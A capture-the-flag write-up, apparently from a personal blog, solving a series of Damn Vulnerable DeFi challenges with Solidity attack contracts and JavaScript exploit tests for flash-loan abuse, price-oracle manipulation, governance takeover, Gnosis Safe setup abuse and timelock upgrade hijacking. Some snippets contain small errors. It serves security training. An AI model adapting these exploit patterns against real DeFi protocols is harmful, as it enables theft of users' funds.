---
emoji: 🧢
title: (DamnVulnerableDefi) solution
date: '2022-09-02 01:18:00'
author: 한성원
tags: DamnVulnerableDeFi writeup Unstoppable NaiveReceiver Truster SideEntrance TheRewarder Selfie Compromised Puppet PuppetV2 FreeRider Backdoor Climber SafeMiners
categories: 취약점분석
---

# CTF name: Damn Vulnerable DeFi
### Challenge name: Unstoppable
### Challenge description: 
    There's a lending pool with a million DVT tokens in balance, offering flash loans for free.

    If only there was a way to attack and stop the pool from offering flash loans ...

    You start with 100 DVT tokens in balance.

- - - 

In this challenge, we need to attack and stop the pool from offering flash loans. __UnstoppableLender contract__ consist of two functions, which is __depositTokens()__ and __flashLoan()__. The vulnerability is included in __flashLoan()__. 

```solidity
    assert(poolBalance == balanceBefore);
```
This line of code in __flashLoan()__ compares __poolBalance__ and __balanceBefore__. If they are not equal to each other it reverts. __poolBalance__ is only update by __depositTokens()__ and __balanceBefore__ is calculated by `damnValuableToken.balanceOf(address(this))` inside of flashLoan. If we send some tokens to UnstoppableLender contratct, __flashLoan()__ and __poolBalance__ never going to match. 



- - -

# CTF name: Damn Vulnerable DeFi
### Challenge name: Naive-Receiver
### Challenge description:
    There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.

    You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.

    Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;)

- - -

In this challenge, we need Drain all ETH funds from the user's contract(FlashLoanReceiver.sol). In __NaiveReceiverLenderPool__ contract, the flashLoan() function does not check if borrower is a authorized user. Since flashLoan() do not authenticate, we can execute flashLoan with any contract address as borrower. We just need to repeat calling flashLoan function with user's contract address. Here is test code to exploit.

```solidity
    it('Exploit', async function () {
        for(let i=0; i<10;i++)
        this.pool.flashLoan(await this.receiver.address, 0)
    });
```

- - -

## CTF name: Damn Vulnerable DeFi
### Challenge name: Truster
### Challenge description:
    More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

    Currently the pool has 1 million DVT tokens in balance. And you have nothing.

    But don't worry, you might be able to take them all from the pool. In a single transaction.

- - -

In this challenge, we need to take all 1 million DVT token from the pool. This pool offers flashLoan and it allows any function call to be executed during the flash loan. Since we can call any function from __TrusterLenderPool contract__, we can call __approve()__ function of DVT token contract. Here is attack contract. 

```solidity
contract AttackTruster{

    function attackTrusterLenderPool(IERC20 token, TrusterLenderPool pool, address attacker) public beforeAfter(token, attacker){
        uint256 balance = IERC20(token).balanceOf(address(pool));
        bytes memory approveData = abi.encodeWithSignature("approve(address,uint256)", address(this), balance);

        pool.flashLoan(0, attacker, address(token), approveData);

        token.transferFrom(address(pool), attacker, balance);
    }
}
```

Here is how it goes. We first get the balance of DVT token of pool and get payload of `approve()` function that allows attacker can withdraw the DVT tokens. Since pool will be the caller of approve function, it does not revert. Then execute flashloan. The first argement of flashLoan function should be 0, so we do not have to payback. All after that, we can withdraw 1 million DVT token using __transferFrom()__.



- - -
## CTF name: Damn Vulnerable DeFi
### Challenge name: Side entrance
### Challenge description:
    A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.

    This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

    You must take all ETH from the lending pool.

- - -

In this challenge, we must take all ETH from the lending pool. __SideEntranceLenderPool contract__ provides flashloan just like previous contracts. This pool contract also contains __deposit()__ and __withdraw()__ functions as well. The vulnerability comes from __deposit()__ function. It increases balance of `msg.sender`, however, it does not check if the balance of pool has really increased. 

There is a line of code in __flashLoan()__:  `IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();`. This line of code allows `msg.sender` to execute __execute()__ function from itself. We can call __deposit()__ function during flash loan to increase balance of ourselves, and we can withdraw.

Here is attack contract:

```soildity
contract FlashLoanEtherReceiver {
    function execute() external payable {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function attackSideEntranceLenderPool(SideEntranceLenderPool pool, address attacker) public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(attacker).transfer(address(this).balance);
    }

    receive() external payable{}
}
```

By calling, attackSideEntranceLenderPool, we execute flashLoan, and during flashLoan, it will execute __execute()__ function from attack contract which will deposit flash loan amount. Then we withdraw from the pool and send stolen ETH to attacker.


- - -
## CTF name: Damn Vulnerable DeFi
### Challenge name: The rewarder
### Challenge description:
    There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.

    Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!

    You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.

    Oh, by the way, rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans?

- - -

In this challenge, we must claim most rewards for ourselves with no DVT token. The challenge also provides flash loan and reward pool. We need to keep an eye on reward pool, `TheRewarderPool.sol`. After deposit DVT token for 5 days, we can get rewards. However, there are already rewards in the pool from previous round, and rewarders have not claimed the reward. 
If we flashloan massive amount of DVT, and deposit to the rewarder pool, we will get most of the reward token.

First, we will borrow max amount of DVT from flashloan, and we will deposit it to rewarder pool. `deposit()` function will trigger `distributeRewards()` function, and since we have deposited very large amount of DVT the it will mint most of reward token. This is possible because `_hasRetrievedReward()` function can not fully validate retrieved address. Finally, we just repay flash loan, and send reward token to attacker. Here is attack contract:ß


```solidity
contract AttackTheRewarder {
    
    address flashLoanerPool;
    address theRewarderPool;
    address rewardToken;
    address liquidity;
    address owner;

    constructor(address _flashLoanerPool, address _rewardToken, address _liquidity, address _theRewarderPool) {
        flashLoanerPool = _flashLoanerPool;
        rewardToken = _rewardToken;
        liquidity = _liquidity;
        theRewarderPool = _theRewarderPool;
        owner = msg.sender;
    }

    function attackTheRewarder() public {
        uint256 amount = DamnValuableToken(liquidity).balanceOf(flashLoanerPool);
        FlashLoanerPool(flashLoanerPool).flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) public {
        DamnValuableToken(liquidity).approve(theRewarderPool, amount);

        TheRewarderPool(theRewarderPool).deposit(amount);
        TheRewarderPool(theRewarderPool).withdraw(amount);

        DamnValuableToken(liquidity).transfer(flashLoanerPool, amount);

        uint256 rewardAmount = RewardToken(rewardToken).balanceOf(address(this));
        RewardToken(rewardToken).transfer(owner, rewardAmount);
    }
}
```

- - -
## CTF name: Damn Vulnerable DeFi
### Challenge name: Selfie
### Challenge description:
    A new cool lending pool has launched! It's now offering flash loans of DVT tokens.

    Wow, and it even includes a really fancy governance mechanism to control it.

    What could go wrong, right ?

    You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.

- - -

In this challenge, we must drain all ETH from Governance pool. According to `_hasEnoughVotes()` function, it is possible to make any action queue if we have more than half of governance token. Since we utilize flash loan of governance token, we can make action queue to call `drainAllFunds()` function. Here is attack contract:

```solidity
contract AttackTheSelfiePool {

    address public selfiePool;
    address public liquidityToken;
    address public simpleGovernance;
    address public attacker_owner;

    uint256 actionId;

    constructor(address _selfiePool, address _damnValuableTokenSnapshot, address _simpleGovernance) {
        selfiePool = _selfiePool;
        liquidityToken = _damnValuableTokenSnapshot;
        simpleGovernance = _simpleGovernance;
        attacker_owner = msg.sender;
    }

    function attackTheSelfiePool() public {
        uint256 borrowAmount = DamnValuableTokenSnapshot(liquidityToken).balanceOf(address(selfiePool));
        SelfiePool(selfiePool).flashLoan(borrowAmount);
    }

    function receiveTokens(address token,uint256 borrowAmount) public {
        DamnValuableTokenSnapshot(liquidityToken).snapshot();

        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", tx.origin);
        actionId = SimpleGovernance(simpleGovernance).queueAction(selfiePool, data, 0);
        DamnValuableTokenSnapshot(liquidityToken).transfer(msg.sender, borrowAmount);
    }

    function executeAction_governance() public payable{
        SimpleGovernance(simpleGovernance).executeAction(actionId);
    }
}
```

First, by calling `attackTheSelfiePool()` function, we can get flash loan, and during flash loan it will call `receiveTokens()` function. `receiveTokens()` function will queueAction with payload of `drainAllFunds()` function and payback the flash loan. After 2 days, just executing action will drain all tokens.


- - -
## CTF name: Damn Vulnerable DeFi
### Challenge name: Compromised
### Challenge descrisption:
    While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:

```
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
```
            
    A related on-chain exchange is selling (absurdly overpriced) collectibles called "DVNFT", now at 999 ETH each

    This price is fetched from an on-chain oracle, and is based on three trusted reporters: 0xA73209FB1a42495120166736362A1DfA9F95A105,0xe92401A4d3af5E446d93D11EEc806b1462b39D15 and 0x81A5D6E50C214044bE44cA0CB057fe119097850c.

    Starting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.

- - -

In this challenge, our goal is to steal all ETH available in the exchange contract. We have received an strange responses from their server which could converted into private keys. We can convert bytes to string, and decode it with base64. It will get us the private keys

After we get private keys, we can access to the accounts freely, and we know the those accounts are two of the trusted account. Since trusted wallets are in charge of oracle, we can manipulate it. 

To drain exchange contract, first we need to change the NFT price to 0 by using `postPrice()` function. Since the price of NFT is median of the 3 account's setted price, the price will be 0. Then we need to buy a NFT at price 0 with `buyOne()` function. After buying, we need to change the price of NFT to the exchange contract's balance. By approving exchange contract we now can sell NFT to exchange contract with contract's balance, and it will drain all ETH from the contract. Lastly, we need to set the price to inital price.

Here is exploit code:

```js
    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        const priKey1 = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35";
        const priKey2 = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34";

        let priKey1ToBase64 = Buffer.from(priKey1.split(' ').join(''),'hex').toString('utf-8');
        let priKey1ToHex = Buffer.from(priKey1ToBase64,'base64').toString('utf-8');
        
        let priKey2ToBase64 = Buffer.from(priKey2.split(' ').join(''),'hex').toString('utf-8');
        let priKey2ToHex = Buffer.from(priKey2ToBase64,'base64').toString('utf-8');

        let TrustedSource1 = new ethers.Wallet(priKey1ToHex, ethers.provider);
        let TrustedSource2 = new ethers.Wallet(priKey2ToHex, ethers.provider);
        console.log("TrustedSource1: ", TrustedSource1.address);
        console.log("TrustedSource2: ", TrustedSource2.address);
        
        await this.oracle.connect(TrustedSource1).postPrice("DVNFT", 0);
        await this.oracle.connect(TrustedSource2).postPrice("DVNFT", 0);

        await this.exchange.connect(attacker).buyOne({value: 1});
    
        await this.oracle.connect(TrustedSource1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE)
        await this.oracle.connect(TrustedSource2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE)

        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
        await this.exchange.connect(attacker).sellOne(0);

        await this.oracle.connect(TrustedSource1).postPrice("DVNFT", INITIAL_NFT_PRICE)
        await this.oracle.connect(TrustedSource2).postPrice("DVNFT", INITIAL_NFT_PRICE)
    });
```


- - -
## CTF name: Damn Vulnerable DeFi
### Challenge name: Puppet
### Challenge description:
    There's a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

    There's a DVT market opened in an Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.

    Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.

- - -

In this challenge, we must steal all tokens from the lending pool. Also the challenge provide UniswapV1 as oracle. However, UniswapV1 has only 10 ETH and 10 DVT, which means that the exchange rate can be easily changed. Since `calculateDepositRequired()` function in `borrow()` function is using UniswapV1, we can manipulate token price by manipulating UniswapV1. 

First we need to approve UniswapV1 to utilze our token, and exchange all DVT token with just 1 ether. Then it will drop the required deposit amount for borrow function to very low like 0.00019... which means we can borrow 1 DVT with 0.00019 ETH. The implementation for what I explained is below.


```javascript
    it('Exploit', async function () {
        const deadline = (await ethers.provider.getBlock("latest")).timestamp * 2;
        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ethers.utils.parseEther('999'), '1', deadline);
        
        const value = {value: ethers.utils.parseEther("24.0")}        
        const attackValue = ethers.utils.parseEther("100000")
        this.lendingPool.connect(attacker).borrow(attackValue, value);
    });
```


- - -
## CTF name: Damn Vulnerable DeFi
### Challenge name: Puppet v2
### Challenge description:
    The developers of the last lending pool are saying that they've learned the lesson. And just released a new version!

    Now they're using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.

    You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)

- - -

In this challenge, we must steal million DVT from the pool. This challenge is very similar to previous challenge, puppet. The difference is that puppet v2 is using Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. However, the oracle still can be manipulated. First we can swap 10000 DVT token to ETH using `swapExactTokensForETH()` function from Uniswap Router. Then we just need to calculate the deposit amount to borrow all DVT from pool. Since we use WeTH to borrow DVT, deposit calculated amount to WETH. Then borrow DVT balance of pool.

```javascript
    it('Exploit', async function () {
        const deadline = (await ethers.provider.getBlock('latest')).timestamp * 2;
        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, 0, [this.token.address, this.weth.address], attacker.address, deadline);
        
        let calculatedDeposit = await ethers.utils.formatEther(ethers.BigNumber.from(await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)));
        let calculatedDepositToStringInETH = ethers.utils.parseEther((Math.ceil(calculatedDeposit * 10) / 10).toString());

        await this.weth.connect(attacker).deposit({value: calculatedDepositToStringInETH } )

        this.weth.connect(attacker).approve(this.lendingPool.address, calculatedDepositToStringInETH);
        this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
    });
```

- - -
## CTF name: Damn Vulnerable DeFi
### Challenge name: Free rider 
### Challenge description:
    A new marketplace of Damn Valuable NFTs has been released! There's been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

    A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn't know how to do it. So it's offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.

    You want to build some rep with this buyer, so you've agreed with the plan.

    Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.

- - -

In this challenge, we have to take 6 NFT from marketplace with only 0.5 ether. In addition, NFT is 15 ether worth. The vulnerability is in the `_buyOne()` function. Here is the line that is vulnerable.

```
    token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);
    payable(token.ownerOf(tokenId)).sendValue(priceToPay);
```

If someone buys NFT, the marketplace transfer the NFT to buyer first. Then send value to token owner, which is now buyer. If only we could get 15 ETH, we can take all NFTs from marketplace. Here is where flash swap is needed. We can get 15 ETH for an instant from __Uniswap__. In `swap()` function in Uniswap pair, we are allow to send data to call `uniswapV2Call()`. We just need to create `uniswapV2Call()` function that buys NFT and return funds to Uniswap pair contract. Here is attack contract.

```solidity
contract AttackerFreeRider is IUniswapV2Callee {

    IUniswapV2Pair public immutable pair;
    FreeRiderNFTMarketplace public immutable marketplace;
    FreeRiderBuyer public immutable partner;
    address payable public  owner;
    IERC721 public immutable nft;
    IWETH public immutable weth;

    uint256[] public tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(address _pair, address _nft, address _marketplace, address _partner, address _weth) {
        pair = IUniswapV2Pair(_pair);
        nft = IERC721(_nft);
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        partner = FreeRiderBuyer(_partner);
        weth = IWETH(_weth);
        owner = payable(msg.sender);
    }

    function attackMarketPlace(uint256 amount) public payable {
        // pair의 swap을 실행시키면 line 33의 uniswapV2Call function 이 실행됨
        pair.swap(amount, 0, address(this), new bytes(1));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        
        weth.withdraw(amount0);
        marketplace.buyMany{value: 15 ether}(tokenIds);
        
        weth.deposit{value: 16 ether}();
        weth.transfer(address(pair), uint(16e18));
        
        for(uint256 i=0; i< tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), address(partner), i);
        }

        owner.transfer(address(this).balance);
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

}
```

In `uniswapV2Call()` function, first withdraw ETH from WETH contract. Secondly, call `buyMany()` function with 15 ETH. As we buy one NFT with 15 ETH, it will return 15 ETH. Since marketplace have 90 ETH balance, marketplace will pay for our purchase. After buy NFTs, we return ETH to Uniswap. Then send NFT to our partner. It will trigger the partner to transfer 45 ETH that was promised. 


- - -
## CTF name: Damn Vulnerable DeFi
### Challenge name: Backdoor 
### Challenge description:
    To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.

    To make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks.

    Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.

    Your goal is to take all funds from the registry. In a single transaction.

- - -

In this challenge, our goal is to take all funds from thie registry. If we look at wallet resigtry contract, it is a proxy callback contract. Also `proxyCreated()` function, the callback function, we can see the parameter `initializer` must be a `GnosisSafe.setup.selector`. Also this setup function is called during `GnosisSafeProxyFactory.createProxyWithCallback()`. When `setup()` function is called, it takes a payload `to` and `data` and etc. The `setupModules()` inside `setup()` function will trigger delegate call to `to` with the `data` as a payload. Here is the vulnerable spot. We can set the module to be our attack contract, and run the `data` payload. Here is the attack contract.

```solidity
contract AttackBackdoor {
    
    address public masterCopy;
    IERC20 public immutable token;
    GnosisSafeProxyFactory public immutable proxyFactory; 
    IProxyCreationCallback public immutable wallet;
    
    constructor(address _masterCopy, address _token, address _proxyFactory, address _wallet){
        masterCopy = _masterCopy; 
        token = IERC20(_token);
        proxyFactory = GnosisSafeProxyFactory(_proxyFactory);
        wallet = IProxyCreationCallback(_wallet);
    }

    function approve(address spender, uint256 amount) public {
        token.approve(spender, amount);
    }

    function attack(address[] memory users) public {
        for(uint i; i<4; i++){
            bytes memory dataToApprove = abi.encodeWithSignature("approve(address,uint256)", address(this), 10 ether);
    
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            bytes memory setUpData = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)", owners, 1, address(this), dataToApprove, address(0), address(0), uint256(0), address(0));

            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(masterCopy, setUpData, 0, wallet); 
            
            token.transferFrom(address(proxy), msg.sender, 10 ether);
        }
    }
}
```

First we need to approve function, that will be delegate called by the proxy contract. This will approve the attack contract to transfer the distributed token. We need to make a token approving data and put into `setup()` function's payload. Then we can transfer the token to the attacker's address, and just repeat this 4 times. 


- - -
## CTF name: Damn Vulnerable DeFi
### Challenge name: Climber 
### Challenge description:
    There's a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern.

    The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.

    On the vault there's an additional role with powers to sweep all tokens in case of an emergency.

    On the timelock, only an account with a "Proposer" role can schedule actions that can be executed 1 hour later.

    Your goal is to empty the vault.

- - -

In this challenge, our goal is to empty the vault. We must to know about UUPS upgrade concept to solve this challenge. Firstly, the vulnerability is found in `Timelock` contract. The `execute()` function does not follows Checks Effects Interactions pattern.

```solidity
    // lines in execute()
    for (uint8 i = 0; i < targets.length; i++) {
        targets[i].functionCallWithValue(dataElements[i], values[i]);
    }
    
    require(getOperationState(id) == OperationState.ReadyForExecution);
```

This code allows us to make a schedule for execution before require statement, which means we can call `execute()` function first, and then add schedule that matches `operationId`. Also, during execution, we can call any function we want with address of __timelock contract__. To go through the require statement, first we need to call `updateDelay()` function with parameter `0`. Then set the attack contract to have proposer role, and call `transferOwnership()` to set the vault owner to be attack contract. Lastly, call `schedule()` function. Here is the attack contract.

```solidity

contract ClimberAttacker {

    address payable public climberTimelock;
    address payable public climberVault;
    address public token;

    address[] public targets;
    uint256[] public values;
    bytes[] public data;

    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    constructor(address payable _climberTimelock, address payable _climberVault, address _token){
        token = _token;
        climberTimelock = _climberTimelock;
        climberVault = _climberVault;
    }

    function attack() public {

        targets.push(climberTimelock);
        values.push(0);
        data.push((abi.encodeWithSignature("updateDelay(uint64)", uint64(0))));

        targets.push(climberTimelock);
        values.push(0);
        data.push(abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this)));

        targets.push(climberVault);
        values.push(0);
        data.push(abi.encodeWithSignature("transferOwnership(address)", address(this)));
        
        targets.push(address(this));
        values.push(0);
        data.push(abi.encodeWithSignature("schedule()"));

        
        (bool success, ) = climberTimelock.call(
            abi.encodeWithSignature("execute(address[],uint256[],bytes[],bytes32)", targets, values, dataElements, bytes32(0))
        );
        require(success, "execute failed");
    }

    function schedule() public {
        ClimberTimelock(climberTimelock).schedule(targets, values, data, bytes32(0));
    }

    function upgradeVault(address _newImp) public{
        ClimberVault(climberVault).upgradeTo(_newImp);
    }
    function sweepFunds(address _token) public {
        ClimberVaultAttackUpgrade(climberVault).sweepFunds(_token);
    }
}
```

In attack contract there are more functions that I have not explained. Since we became the owner of vault contract, we can upgrade vault contract to our new logic contract, so I built a new logic contract that allow us to sweep all the funds.

```solidity
contract ClimberVaultAttackUpgrade is Initializable, OwnableUpgradeable, UUPSUpgradeable{

    //constructor() initializer {}
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;
    address public attacker;

    function initialize(address _attacker) initializer external {
        __Ownable_init();
        __UUPSUpgradeable_init();
    }

    function sweepFunds(address tokenAddress) public {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(tx.origin, token.balanceOf(address(this))), "Transfer failed");
    }

    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}

}
```

Lastly, here is script I used to exploit the vault.

```js
    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        this.attackContract = await (await ethers.getContractFactory('ClimberAttacker', attacker)).deploy(this.timelock.address, this.vault.address, this.token.address);
        this.attackUpgradableContract = await (await ethers.getContractFactory('ClimberVaultAttackUpgrade')).deploy();

        await this.attackContract.connect(attacker).attack();
        this.attackContract.connect(attacker).upgradeVault(this.attackUpgradableContract.address);
        this.attackContract.connect(attacker).sweepFunds(this.token.address)
    });
```

```toc

```